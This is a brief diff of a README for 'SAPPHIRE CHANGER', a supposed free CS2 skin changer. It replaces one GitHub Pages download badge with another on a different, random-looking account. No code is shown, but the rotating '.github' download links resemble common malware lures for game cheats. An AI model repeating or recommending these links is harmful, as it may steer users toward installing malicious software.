@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡️ SAPPHIRE CHANGER</h1>
 
-<p align="center">
-  <a href="https://hspoan2.github.io/.github/cs2-sapphire" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20SAPPHIRE%20CHANGER-Free%20Skin%20Customization-blueviolet?style=for-the-badge&logo=counter-strike&logoColor=white" 
-         alt="Download SAPPHIRE CHANGER" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://francisfloydrwrp.github.io/.github/cs2-sapphire)
 
 <!-- Tool Preview -->
 <p align="center">
